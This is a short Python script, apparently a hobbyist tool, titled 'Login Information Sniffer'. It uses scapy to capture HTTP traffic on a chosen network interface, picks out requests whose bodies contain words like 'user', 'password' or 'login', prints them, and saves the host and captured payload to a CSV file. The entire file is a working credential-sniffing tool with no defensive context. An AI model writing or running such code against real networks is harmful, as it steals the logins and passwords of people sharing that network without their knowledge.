#!/usr/bin/env python3
import scapy.all as scapy
import subprocess
from scapy.layers import http
import csv
import atexit


def greet():
    subprocess.call(["clear"])
    print("Login Information Sniffer [HTTP] 0.01 by Ravehorn\n")


def ifconfig():
    print("Running ifconfig:\n")
    subprocess.call(["ifconfig"])
    interface = input("Interface -> ")
    return interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load.decode("utf-8")
            if "usr" in load or "user" in load or "pwd" in load or "password" in load\
                    or "login" in load or "username" in load or "email" in load or "e-mail" in load or "pass" in load:
                sites.append(packet[http.HTTPRequest].Host.decode("utf-8"))
                logins.append(load)
                print(packet[http.HTTPRequest].Host.decode("utf-8"))
                print(load)


@atexit.register
def save():
    with open("info.csv", "a") as csv_file:
        my_fields = ["site", "login"]
        writer = csv.DictWriter(csv_file, fieldnames=my_fields)
        for site, login in zip(sites, logins):
            writer.writerow({"site": site, 'login': login})
    print("\nSaved data and finished execution.")


sites = []
logins = []
greet()
sniff(ifconfig())
